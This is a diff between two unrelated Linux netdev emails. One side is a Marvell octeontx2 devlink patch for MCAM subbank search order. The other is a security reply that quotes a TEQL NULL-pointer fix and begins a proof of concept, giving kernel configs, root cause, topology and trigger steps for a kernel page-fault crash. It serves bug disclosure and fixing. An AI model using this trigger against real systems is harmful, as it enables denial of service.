@@ -1,367 +1,466 @@
-Received: from mx0b-0016f401.pphosted.com (mx0b-0016f401.pphosted.com [67.231.156.173])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-dl1-f42.google.com (mail-dl1-f42.google.com [74.125.82.42])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 436A3327C13;
-	Wed,  4 Mar 2026 04:57:50 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=67.231.156.173
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1B11D1E515
+	for <netdev@vger.kernel.org>; Wed,  4 Mar 2026 05:22:32 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.42
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1772600271; cv=none; b=UM0Q9KAlRohuQNWPY/uUTGsSSiqhkY7Nt9n3f2fBiri3UPhAaoMyMMaC+h/kGSNg7PyKOoLBkZ9d+AfK7d8T4yJOakSX3HG2+lhZnn218i03jEbyUZ7sNMATTm9OFlI/lkp16T+FI+NeS2GNPFAwfohVOStssYmRconUWSXcptQ=
+	t=1772601754; cv=none; b=spO9Rex2au9UuQD+rddIvdk2QToQSu9Y7mY6CyO/FHw4pDNjA8UgrHQwQbQxDBQB+V/2iwnESSWCfEKK3GlT3hLt+TPjWK3FlyKxNN/jglv1wBogw51qHknxOXHa3/J8jwaIwb4HQZqk/McK9TiWDL+/ivK8sp2ki8XvG7QzmeM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1772600271; c=relaxed/simple;
-	bh=J7f8Iq4ztk7dTlOrKgNl8rtkFhNk7WBuXEIoaPbe67I=;
-	h=From:To:CC:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=on8FsIYJ+01sHWICxI8nd8Y90jLb9vRJQveNClCEa+f9HgDuJq2gw/cqh9idk/qIN7T4bksLhrrT4QySk5j9z5So4ok3qWy4+jXEoEYk8QdTGx7wa7WuDIAwlA92sFqSrlO+LbOCnWPdQrUTYv6/1HECf9f4acFe6n0ClPVdywY=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=marvell.com; spf=pass smtp.mailfrom=marvell.com; dkim=pass (2048-bit key) header.d=marvell.com header.i=@marvell.com header.b=O8NzcEdm; arc=none smtp.client-ip=67.231.156.173
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=marvell.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=marvell.com
+	s=arc-20240116; t=1772601754; c=relaxed/simple;
+	bh=U4ZloGSCcwdvCZUYxiozlTQLm7RkhCTh2KXscT3xMiY=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=NRlw+SoWoR7BoSUcPaMaiDImZ4+jSQe6qlWw/NMmcf1eHCv9LQ3AUrX7dCewrKDGWQV56+pB8e9Bhq0wNtFQi2+6Lihpwg3joEQF59PgZZRBzro1khiP/wtafR09GXMQxHAm0f1c8+IKLyIZo84y8gDi+a+BSO7mhp1xxSWdC6k=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=Yz0klhkN; arc=none smtp.client-ip=74.125.82.42
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=marvell.com header.i=@marvell.com header.b="O8NzcEdm"
-Received: from pps.filterd (m0431383.ppops.net [127.0.0.1])
-	by mx0b-0016f401.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 623NSssC1743662;
-	Tue, 3 Mar 2026 20:31:46 -0800
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=marvell.com; h=
-	cc:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=pfpt0220; bh=x
-	IOkvsN5VWQhpgofMa4LGp4ATAUN9Cb319Ymiu4TA7s=; b=O8NzcEdmRrcuLKE9B
-	Tytl3q0UgvX0/6SyJ8KQncXalREEiLuvJ1OZtFhLhkOFRLc5jSY7MmzRbFtD2Z9p
-	3A9YxrddWSOYxhYk14Es7BGRCmAydIwkJzZTECPWu1oNn9sqOA0z2KJVomxZ0PNk
-	kY1SXWII3ak2U9cEOOflirZiOS9T524odTHJ6c9UPDyId++7uKURI/+wb9VUdAKv
-	h+/dirBwW4WeIXihur0VuDBZWI7U7JmMnACbL6oHLeTzRO/OkvVU0koNO+5lvjQn
-	6D5cX5zqTrYWOyYTO8npFKuceM43vOuDbTvojey/ycyZfhg5kI0lvcpIvujtCiAF
-	VUAhg==
-Received: from dc6wp-exch02.marvell.com ([4.21.29.225])
-	by mx0b-0016f401.pphosted.com (PPS) with ESMTPS id 4cp9bg0k4t-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Tue, 03 Mar 2026 20:31:45 -0800 (PST)
-Received: from DC6WP-EXCH02.marvell.com (10.76.176.209) by
- DC6WP-EXCH02.marvell.com (10.76.176.209) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.1544.25; Tue, 3 Mar 2026 20:31:45 -0800
-Received: from maili.marvell.com (10.69.176.80) by DC6WP-EXCH02.marvell.com
- (10.76.176.209) with Microsoft SMTP Server id 15.2.1544.25 via Frontend
- Transport; Tue, 3 Mar 2026 20:31:45 -0800
-Received: from rkannoth-OptiPlex-7090.. (unknown [10.28.36.165])
-	by maili.marvell.com (Postfix) with ESMTP id D4AA33F706A;
-	Tue,  3 Mar 2026 20:31:40 -0800 (PST)
-From: Ratheesh Kannoth <rkannoth@marvell.com>
-To: <netdev@vger.kernel.org>, <linux-kernel@vger.kernel.org>
-CC: <sgoutham@marvell.com>, <davem@davemloft.net>, <edumazet@google.com>,
-        <kuba@kernel.org>, <pabeni@redhat.com>, <horms@kernel.org>,
-        <donald.hunter@gmail.com>, <jiri@resnulli.us>,
-        <chuck.lever@oracle.com>, <matttbe@kernel.org>, <cjubran@nvidia.com>,
-        <shshitrit@nvidia.com>, "Ratheesh
- Kannoth" <rkannoth@marvell.com>
-Subject: [PATCH v2 net-next 3/5] octeontx2-af: npc: cn20k: add subbank search order control
-Date: Wed, 4 Mar 2026 10:00:30 +0530
-Message-ID: <20260304043032.3661647-4-rkannoth@marvell.com>
-X-Mailer: git-send-email 2.43.0
-In-Reply-To: <20260304043032.3661647-1-rkannoth@marvell.com>
-References: <20260304043032.3661647-1-rkannoth@marvell.com>
+	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="Yz0klhkN"
+Received: by mail-dl1-f42.google.com with SMTP id a92af1059eb24-1273349c56bso7832793c88.0
+        for <netdev@vger.kernel.org>; Tue, 03 Mar 2026 21:22:32 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=asu.edu; s=google; t=1772601752; x=1773206552; darn=vger.kernel.org;
+        h=in-reply-to:content-disposition:mime-version:references:message-id
+         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
+        bh=4tzRj8aRURPokZWuHDSR7JW4ZtJZUafGiSP067OLDp8=;
+        b=Yz0klhkN55/f5Km/64Lx7eJ3wgHS/tH/gGN6e1oF59Nn5MLEyWwbeqdYCo3ympMxwV
+         yFltI6Ozo/FeO4yPtPfz3smaPwKgMlosEI/mnb/DARmqd9mwqv0LiD/cXmUa6eFUl+JU
+         tTmmcEdBBiE1+mnMO5jneuIgHzeYdpOdGKho4n79M0orDrp+ehXdKKsjeAy0o6t31HP+
+         /+8Hwe20L5tPTK0Do/Pr4ZakRognaHXPRXIpy/cULIyuwLdfwtuZ/cr4DBv4AkWMlAk6
+         WyjkhcYtGs96qp49dmQslj7kmmZnDA5HbyejNjgBs0v4W36VkxHGy3RXPbGHm57A3cT3
+         LADQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1772601752; x=1773206552;
+        h=in-reply-to:content-disposition:mime-version:references:message-id
+         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to;
+        bh=4tzRj8aRURPokZWuHDSR7JW4ZtJZUafGiSP067OLDp8=;
+        b=EX7hnWGHGIP8JwDy0+Ar/eiWgzgH1idFXn2XmlUh+O+mYo/vm361sOaFFgoHrjZrXE
+         g92TZ07nQoMNYpTYytcQon7yiz6FcTXeLtOB/NNBV8JRuwAgiZFijzfN2kDfSK/yMp2O
+         0GzlHOdYNkxy2+9yF2E6mdsdHdWV0DYRha59oWiziTs7v/7rs/cFBEPP76EwSjpYVn3r
+         rTT6QZn7zQst4ct38WTJRTssR4mYZoJBd0MHWVEnRCumhY7alf+nOf6/g3apX+9E4sPF
+         Q9wqCuiC3KlBggPhOMhj/7mcBYz5bACBxkX6bRYsESI2z/T+QIEWGVJx3a1ufC25SeZm
+         GyMw==
+X-Forwarded-Encrypted: i=1; AJvYcCWQzhRCWp7f2dKOQtkXtdwwYLASKSzvTKbZiMZBY0vrUn1i3B9hfXvK/TLG5imerQD8OLzxUos=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yw8wwYGfh14Frx+YvqfTUZKWSKO+QgtU6yzeatYx3i1erBAuHeW
+	pJgVTVRoG8Vv+RjoRffNlTQTXETadMxV0DgruOobeu1IQGAImLBQ8+j+1mx9jnsBUg==
+X-Gm-Gg: ATEYQzwMqa3SdD8fKbgdxz5Ic614wMJZEnmEa6r/Cnl9xthFvdmOqhnrf/uanvH3M4q
+	gcW6jXLiuBGXSdhbDCaw34mfeAtkaPXIfv4fvuYuzmJIF3AsRPcbjBsO18/w7BX4GSCsYffgPjh
+	QFmdmhyr6DKJPX5MuuTtMOvahW/sU07DY7e816fnxv+SCIT9buf5IUbRAK/oQckFuzSFnqYGYlA
+	n8X80NKLkqk4XwtGjzj32q63UG8NZ218/uAatZ0Zv1vxgIzPjKgXYFvqsRJohB/7uBQlqfGvH7j
+	T9PE1mzaXF2ngBbIbijfWW3M288wBaDsZpRRam/zzUpMHt/Z2dKlae1faOQaQEsdIEbITfZC4cF
+	frQLejSAllwToCcsVZmjEX9H6Qbf9nIx+25MSFIOQr0c4X2EjnvUDFaISOwdfbVi5/TVVY089Qi
+	gEH4ZAnbJj6hLfRyJ6IbqVTAdPz1uLmNbhHot6ebLS
+X-Received: by 2002:a05:7022:f102:b0:127:5cda:ab0f with SMTP id a92af1059eb24-128b7073451mr376117c88.5.1772601752016;
+        Tue, 03 Mar 2026 21:22:32 -0800 (PST)
+Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
+        by smtp.gmail.com with ESMTPSA id a92af1059eb24-12789a32dabsm20795764c88.11.2026.03.03.21.22.31
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Tue, 03 Mar 2026 21:22:31 -0800 (PST)
+Date: Tue, 3 Mar 2026 22:22:29 -0700
+From: Xiang Mei <xmei5@asu.edu>
+To: bestswngs@gmail.com
+Cc: security@kernel.org, edumazet@google.com, davem@davemloft.net, 
+	kuba@kernel.org, pabeni@redhat.com, horms@kernel.org, netdev@vger.kernel.org, 
+	linux-kernel@vger.kernel.org
+Subject: Re: [PATCH] net/sched: teql: fix NULL pointer dereference in
+ iptunnel_xmit on TEQL slave xmit
+Message-ID: <rqhnwmdeb5u7nl6urhkkhixeukhlkcpveec5fzrvfn35rx2c22@ozbglzayolmp>
+References: <20260304044216.3517851-3-bestswngs@gmail.com>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-Content-Type: text/plain
-X-Authority-Analysis: v=2.4 cv=NarrFmD4 c=1 sm=1 tr=0 ts=69a7b5b2 cx=c_pps
- a=gIfcoYsirJbf48DBMSPrZA==:117 a=gIfcoYsirJbf48DBMSPrZA==:17
- a=Yq5XynenixoA:10 a=VkNPw1HP01LnGYTKEx00:22 a=l0iWHRpgs5sLHlkKQ1IR:22
- a=qit2iCtTFQkLgVSMPQTB:22 a=M5GUcnROAAAA:8 a=8jigV8OpJpFA5nra9NUA:9
- a=OBjm3rFKGHvpk9ecZwUJ:22
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwMzA0MDAzNSBTYWx0ZWRfX6Ze6HZkiSRD2
- 3fUjvhGlwIKa0+jR7/8obVarvihyPK4JROjOUsf7920zAlM1dwjE0WLL6PH6Dsr20hQqQ8SB955
- KbYcSxulq9jFgnYaHK+jXV6eMdWDBU8hxnzYG/KcJpvDPzOV4a53Fv/FAJGnH2Y333lMfNq8bWC
- 9Lkisp6YsaqWJepsu3gkuWiKGxISVPAN5AutGBTin39VgNoG0w3k7j92VoQo69vqufHeb8JcUEm
- C5MENkKWtvlobDQNh1vpTrVM5tqwTk1Orkgt8F6J7YnpdSIq843fTgC/CWQHNjbUat0M16ZRWUg
- i+Dv9d3FObmIHQqaxDgNxNyG25ld/L9rAnrsI19CJLD68feYHb0q5f5tB5BqbYVL/A0792yZxVl
- a4owXm1rCX2NQzuyyUg7v9n39IR3xTagUM/LLH8SrO68LSlfee+M3jvNjXTQ7GIsH0H3UUwIifu
- 3Pd3bVPGyOrhotsmOWA==
-X-Proofpoint-GUID: IS5iqkGMnD2z13TzHhvU3mjizn4GRbUM
-X-Proofpoint-ORIG-GUID: IS5iqkGMnD2z13TzHhvU3mjizn4GRbUM
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1121,Hydra:6.1.51,FMLib:17.12.100.49
- definitions=2026-03-04_02,2026-03-03_01,2025-10-01_01
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20260304044216.3517851-3-bestswngs@gmail.com>
 
-CN20K NPC MCAM is split into 32 subbanks that are searched in a
-predefined order during allocation. Lower-numbered subbanks have
-higher priority than higher-numbered ones.
+On Wed, Mar 04, 2026 at 12:42:18PM +0800, bestswngs@gmail.com wrote:
+> From: Weiming Shi <bestswngs@gmail.com>
+> 
+> teql_master_xmit() calls netdev_start_xmit(skb, slave) to transmit
+> through slave devices, but does not update skb->dev to the slave device
+> beforehand.
+> 
+> When a gretap tunnel is a TEQL slave, the transmit path reaches
+> iptunnel_xmit() which saves dev = skb->dev (still pointing to teql0
+> master) and later calls iptunnel_xmit_stats(dev, pkt_len). This
+> function does:
+> 
+>     get_cpu_ptr(dev->tstats)
+> 
+> Since teql_master_setup() does not set dev->pcpu_stat_type to
+> NETDEV_PCPU_STAT_TSTATS, the core network stack never allocates tstats
+> for teql0, so dev->tstats is NULL. get_cpu_ptr(NULL) computes
+> NULL + __per_cpu_offset[cpu], resulting in a page fault.
+> 
+>  BUG: unable to handle page fault for address: ffff8880e6659018
+>  #PF: supervisor write access in kernel mode
+>  #PF: error_code(0x0002) - not-present page
+>  PGD 68bc067 P4D 68bc067 PUD 0
+>  Oops: Oops: 0002 [#1] SMP KASAN PTI
+>  RIP: 0010:iptunnel_xmit (./include/net/ip_tunnels.h:664 net/ipv4/ip_tunnel_core.c:89)
+>  Call Trace:
+>   <TASK>
+>   ip_tunnel_xmit (net/ipv4/ip_tunnel.c:847)
+>   __gre_xmit (net/ipv4/ip_gre.c:478)
+>   gre_tap_xmit (net/ipv4/ip_gre.c:779)
+>   teql_master_xmit (net/sched/sch_teql.c:319)
+>   dev_hard_start_xmit (net/core/dev.c:3887)
+>   sch_direct_xmit (net/sched/sch_generic.c:347)
+>   __dev_queue_xmit (net/core/dev.c:4802)
+>   neigh_direct_output (net/core/neighbour.c:1660)
+>   ip_finish_output2 (net/ipv4/ip_output.c:237)
+>   __ip_finish_output.part.0 (net/ipv4/ip_output.c:315)
+>   ip_mc_output (net/ipv4/ip_output.c:369)
+>   ip_send_skb (net/ipv4/ip_output.c:1508)
+>   udp_send_skb (net/ipv4/udp.c:1195)
+>   udp_sendmsg (net/ipv4/udp.c:1485)
+>   inet_sendmsg (net/ipv4/af_inet.c:859)
+>   __sys_sendto (net/socket.c:2206)
+> 
+> Fix this by setting skb->dev = slave before calling
+> netdev_start_xmit(), so that tunnel xmit functions see the correct
+> slave device with properly allocated tstats.
+> 
+> Fixes: 039f50629b7f ("ip_tunnel: Move stats update to iptunnel_xmit()")
+> Reported-by: Xiang Mei <xmei5@asu.edu>
+> Signed-off-by: Weiming Shi <bestswngs@gmail.com>
+> ---
+>  net/sched/sch_teql.c | 1 +
+>  1 file changed, 1 insertion(+)
+> 
+> diff --git a/net/sched/sch_teql.c b/net/sched/sch_teql.c
+> index 6e4bdaa876ed..783300d8b019 100644
+> --- a/net/sched/sch_teql.c
+> +++ b/net/sched/sch_teql.c
+> @@ -315,6 +315,7 @@ static netdev_tx_t teql_master_xmit(struct sk_buff *skb, struct net_device *dev)
+>  			if (__netif_tx_trylock(slave_txq)) {
+>  				unsigned int length = qdisc_pkt_len(skb);
+>  
+> +				skb->dev = slave;
+>  				if (!netif_xmit_frozen_or_stopped(slave_txq) &&
+>  				    netdev_start_xmit(skb, slave, slave_txq, false) ==
+>  				    NETDEV_TX_OK) {
+> -- 
+> 2.43.0
+>
 
-Add a runtime devlink parameter "srch_order" (
-DEVLINK_PARAM_TYPE_U32_ARRAY) to control the order in which
-subbanks are searched during MCAM allocation.
+Here is a PoC for your ref and please test the poc on the kernel enabled
+```
+  CONFIG_NET_SCHED=y          # qdisc framework                                                                                                                                                                                                                                                      
+  CONFIG_NET_SCH_TEQL=y       # the buggy TEQL qdisc
+  CONFIG_NET_IPGRE_DEMUX=y    # GRE demux
+  CONFIG_NET_IPGRE=y          # gretap tunnel
+  CONFIG_NET_IP_TUNNEL=y      # ip tunnel core
+```
 
-Signed-off-by: Ratheesh Kannoth <rkannoth@marvell.com>
----
- drivers/base/memory.c                         |  1 -
- .../ethernet/marvell/octeontx2/af/cn20k/npc.c | 87 ++++++++++++++++++
- .../ethernet/marvell/octeontx2/af/cn20k/npc.h |  2 +
- .../marvell/octeontx2/af/rvu_devlink.c        | 92 +++++++++++++++++--
- 4 files changed, 171 insertions(+), 11 deletions(-)
+```c
+// PoC: TEQL iptunnel_xmit NULL tstats page fault
+//
+// Bug: When a gretap device is a TEQL slave and transmits a packet,
+// iptunnel_xmit() reads skb->dev to update per-CPU tunnel stats.
+// However, skb->dev still points to the teql0 master device (not
+// the gretap slave), and teql0 does not allocate dev->tstats.
+// This causes a NULL pointer dereference in iptunnel_xmit_stats().
+//
+// Root Cause:
+//   teql_master_xmit() calls netdev_start_xmit(skb, slave, ...) to
+//   send the skb through a gretap slave. However, it does NOT set
+//   skb->dev = slave beforehand. Neither does netdev_start_xmit(),
+//   gre_tap_xmit(), __gre_xmit(), nor ip_tunnel_xmit().
+//
+//   So when iptunnel_xmit() saves dev = skb->dev (line 57 of
+//   ip_tunnel_core.c), dev is still teql0, not gretapN.
+//
+//   After ip_local_out(), iptunnel_xmit_stats(dev, pkt_len) calls:
+//     get_cpu_ptr(dev->tstats)
+//
+//   teql0->tstats is NULL because teql_master_setup() does not set
+//   dev->pcpu_stat_type = NETDEV_PCPU_STAT_TSTATS, so the core
+//   network stack never allocates tstats for teql0.
+//
+//   get_cpu_ptr(NULL) computes: NULL + __per_cpu_offset[cpu]
+//   = __per_cpu_offset[0] (the GS base), which may point to an
+//   unmapped page (PUD=0), causing a page fault.
+//
+// Call trace:
+//   sendto() [userspace]
+//     udp_sendmsg
+//       ip_send_skb -> ip_mc_output -> ip_finish_output2
+//         neigh_direct_output -> __dev_queue_xmit(teql0)
+//           sch_direct_xmit -> dev_hard_start_xmit
+//             teql_master_xmit
+//               netdev_start_xmit(skb, gretapN)    <-- skb->dev still = teql0
+//                 gre_tap_xmit -> __gre_xmit
+//                   ip_tunnel_xmit -> iptunnel_xmit
+//                     dev = skb->dev = teql0        <-- teql0, NOT gretapN!
+//                     ip_local_out(...)
+//                     iptunnel_xmit_stats(dev, ...)
+//                       get_cpu_ptr(dev->tstats)    <-- dev->tstats == NULL
+//                       CRASH: page fault
+//
+// Topology:
+//   teql0 (master, 10.1.1.1/24)
+//   gretap1..7 (TEQL slaves, remotes 10.1.1.2..8, routed via teql0)
+//   Static ARP entries on teql0 for 10.1.1.2..8
+//
+// Trigger: send multicast or unicast UDP through teql0
 
-diff --git a/drivers/base/memory.c b/drivers/base/memory.c
-index a3091924918b..88762061e0a1 100644
---- a/drivers/base/memory.c
-+++ b/drivers/base/memory.c
-@@ -97,7 +97,6 @@ static void memory_block_release(struct device *dev)
- 	kfree(mem);
- }
- 
--
- /* Max block size to be set by memory_block_advise_max_size */
- static unsigned long memory_block_advised_size;
- static bool memory_block_advised_size_queried;
-diff --git a/drivers/net/ethernet/marvell/octeontx2/af/cn20k/npc.c b/drivers/net/ethernet/marvell/octeontx2/af/cn20k/npc.c
-index e854b85ced9e..348a72c4ee43 100644
---- a/drivers/net/ethernet/marvell/octeontx2/af/cn20k/npc.c
-+++ b/drivers/net/ethernet/marvell/octeontx2/af/cn20k/npc.c
-@@ -3809,6 +3809,93 @@ static void npc_unlock_all_subbank(void)
- 		mutex_unlock(&npc_priv.sb[i].lock);
- }
- 
-+int npc_cn20k_search_order_set(struct rvu *rvu,
-+			       u32 arr[MAX_NUM_SUB_BANKS], int cnt)
-+{
-+	struct npc_mcam *mcam = &rvu->hw->mcam;
-+	u32 fslots[MAX_NUM_SUB_BANKS][2];
-+	u32 uslots[MAX_NUM_SUB_BANKS][2];
-+	int fcnt = 0, ucnt = 0;
-+	struct npc_subbank *sb;
-+	int idx, val, rc = 0;
-+
-+	unsigned long index;
-+	void *v;
-+
-+	if (cnt != npc_priv.num_subbanks) {
-+		dev_err(rvu->dev, "Number of entries(%u) != %u\n",
-+			cnt, npc_priv.num_subbanks);
-+		return -EINVAL;
-+	}
-+
-+	mutex_lock(&mcam->lock);
-+	npc_lock_all_subbank();
-+	restrict_valid = false;
-+
-+	for (int i = 0; i < cnt; i++)
-+		subbank_srch_order[i] = arr[i];
-+
-+	xa_for_each(&npc_priv.xa_sb_used, index, v) {
-+		val = xa_to_value(v);
-+		uslots[ucnt][0] = index;
-+		uslots[ucnt][1] = val;
-+		xa_erase(&npc_priv.xa_sb_used, index);
-+		ucnt++;
-+	}
-+
-+	xa_for_each(&npc_priv.xa_sb_free, index, v) {
-+		val = xa_to_value(v);
-+		fslots[fcnt][0] = index;
-+		fslots[fcnt][1] = val;
-+		xa_erase(&npc_priv.xa_sb_free, index);
-+		fcnt++;
-+	}
-+
-+	/* xa_store() is done under lock. If xa_store fails
-+	 * ,no rollback is planned as it might also fail.
-+	 */
-+	for (int i = 0; i < ucnt; i++) {
-+		idx  = uslots[i][1];
-+		sb = &npc_priv.sb[idx];
-+		sb->arr_idx = subbank_srch_order[sb->idx];
-+		rc = xa_err(xa_store(&npc_priv.xa_sb_used, sb->arr_idx,
-+				     xa_mk_value(sb->idx), GFP_KERNEL));
-+		if (rc) {
-+			dev_err(rvu->dev,
-+				"Error to insert index to used list %u\n",
-+				sb->idx);
-+			goto fail_used;
-+		}
-+	}
-+
-+	for (int i = 0; i < fcnt; i++) {
-+		idx  = fslots[i][1];
-+		sb = &npc_priv.sb[idx];
-+		sb->arr_idx = subbank_srch_order[sb->idx];
-+		rc = xa_err(xa_store(&npc_priv.xa_sb_free, sb->arr_idx,
-+				     xa_mk_value(sb->idx), GFP_KERNEL));
-+		if (rc) {
-+			dev_err(rvu->dev,
-+				"Error to insert index to free list %u\n",
-+				sb->idx);
-+			goto fail_used;
-+		}
-+	}
-+
-+fail_used:
-+	npc_unlock_all_subbank();
-+	mutex_unlock(&mcam->lock);
-+
-+	return rc;
-+}
-+
-+const u32 *npc_cn20k_search_order_get(bool *restricted_order, u32 *sz)
-+{
-+	*restricted_order = restrict_valid;
-+	*sz = npc_priv.num_subbanks;
-+	return subbank_srch_order;
-+}
-+
- /* Only non-ref non-contigous mcam indexes
-  * are picked for defrag process
-  */
-diff --git a/drivers/net/ethernet/marvell/octeontx2/af/cn20k/npc.h b/drivers/net/ethernet/marvell/octeontx2/af/cn20k/npc.h
-index 004a556c7b90..b168ecfbc5c8 100644
---- a/drivers/net/ethernet/marvell/octeontx2/af/cn20k/npc.h
-+++ b/drivers/net/ethernet/marvell/octeontx2/af/cn20k/npc.h
-@@ -343,5 +343,7 @@ int npc_cn20k_defrag(struct rvu *rvu);
- int npc_mcam_idx_2_subbank_idx(struct rvu *rvu, u16 mcam_idx,
- 			       struct npc_subbank **sb,
- 			       int *sb_off);
-+const u32 *npc_cn20k_search_order_get(bool *restricted_order, u32 *sz);
-+int npc_cn20k_search_order_set(struct rvu *rvu, u32 arr[32], int cnt);
- 
- #endif /* NPC_CN20K_H */
-diff --git a/drivers/net/ethernet/marvell/octeontx2/af/rvu_devlink.c b/drivers/net/ethernet/marvell/octeontx2/af/rvu_devlink.c
-index 287ff0eda152..420cda6d5d5f 100644
---- a/drivers/net/ethernet/marvell/octeontx2/af/rvu_devlink.c
-+++ b/drivers/net/ethernet/marvell/octeontx2/af/rvu_devlink.c
-@@ -1258,6 +1258,7 @@ enum rvu_af_dl_param_id {
- 	RVU_AF_DEVLINK_PARAM_ID_NPC_EXACT_FEATURE_DISABLE,
- 	RVU_AF_DEVLINK_PARAM_ID_NPC_DEF_RULE_CNTR_ENABLE,
- 	RVU_AF_DEVLINK_PARAM_ID_NPC_DEFRAG,
-+	RVU_AF_DEVLINK_PARAM_ID_NPC_SRCH_ORDER,
- 	RVU_AF_DEVLINK_PARAM_ID_NIX_MAXLF,
- };
- 
-@@ -1619,12 +1620,83 @@ static int rvu_devlink_eswitch_mode_set(struct devlink *devlink, u16 mode,
- 	return 0;
- }
- 
-+static int rvu_af_dl_npc_srch_order_set(struct devlink *devlink, u32 id,
-+					struct devlink_param_gset_ctx *ctx,
-+					struct netlink_ext_ack *extack)
-+{
-+	struct rvu_devlink *rvu_dl = devlink_priv(devlink);
-+	struct rvu *rvu = rvu_dl->rvu;
-+
-+	return npc_cn20k_search_order_set(rvu,
-+					  ctx->val.u32arr.val,
-+					  ctx->val.u32arr.size);
-+}
-+
-+static int rvu_af_dl_npc_srch_order_get(struct devlink *devlink, u32 id,
-+					struct devlink_param_gset_ctx *ctx,
-+					struct netlink_ext_ack *extack)
-+{
-+	bool restricted_order;
-+	const u32 *order;
-+	u32 sz;
-+
-+	order = npc_cn20k_search_order_get(&restricted_order, &sz);
-+	ctx->val.u32arr.size = sz;
-+	for (int i = 0; i < sz; i++)
-+		ctx->val.u32arr.val[i] = order[i];
-+
-+	return 0;
-+}
-+
-+static int rvu_af_dl_npc_srch_order_validate(struct devlink *devlink, u32 id,
-+					     union devlink_param_value val,
-+					     struct netlink_ext_ack *extack)
-+{
-+	struct rvu_devlink *rvu_dl = devlink_priv(devlink);
-+	struct rvu *rvu = rvu_dl->rvu;
-+	bool restricted_order;
-+	unsigned long w = 0;
-+	u32 *arr;
-+	u32 sz;
-+
-+	npc_cn20k_search_order_get(&restricted_order, &sz);
-+	if (sz != val.u32arr.size) {
-+		dev_err(rvu->dev,
-+			"Wrong size %u, should be %u\n",
-+			val.u32arr.size, sz);
-+		return -EINVAL;
-+	}
-+
-+	arr = val.u32arr.val;
-+	for (int i = 0; i < sz; i++) {
-+		if (arr[i] >= sz)
-+			return -EINVAL;
-+
-+		w |= BIT_ULL(arr[i]);
-+	}
-+
-+	if (bitmap_weight(&w, sz) != sz) {
-+		dev_err(rvu->dev,
-+			"Duplicate or out-of-range subbank index. %lu\n",
-+			find_first_zero_bit(&w, sz));
-+		return -EINVAL;
-+	}
-+
-+	return 0;
-+}
-+
- static const struct devlink_ops rvu_devlink_ops = {
- 	.eswitch_mode_get = rvu_devlink_eswitch_mode_get,
- 	.eswitch_mode_set = rvu_devlink_eswitch_mode_set,
- };
- 
--static const struct devlink_param rvu_af_dl_param_defrag[] = {
-+static const struct devlink_param rvu_af_dl_cn20k_params[] = {
-+	DEVLINK_PARAM_DRIVER(RVU_AF_DEVLINK_PARAM_ID_NPC_SRCH_ORDER,
-+			     "npc_srch_order", DEVLINK_PARAM_TYPE_U32_ARRAY,
-+			     BIT(DEVLINK_PARAM_CMODE_RUNTIME),
-+			     rvu_af_dl_npc_srch_order_get,
-+			     rvu_af_dl_npc_srch_order_set,
-+			     rvu_af_dl_npc_srch_order_validate),
- 	DEVLINK_PARAM_DRIVER(RVU_AF_DEVLINK_PARAM_ID_NPC_DEFRAG,
- 			     "npc_defrag", DEVLINK_PARAM_TYPE_STRING,
- 			     BIT(DEVLINK_PARAM_CMODE_RUNTIME),
-@@ -1666,13 +1738,13 @@ int rvu_register_dl(struct rvu *rvu)
- 	}
- 
- 	if (is_cn20k(rvu->pdev)) {
--		err = devlink_params_register(dl, rvu_af_dl_param_defrag,
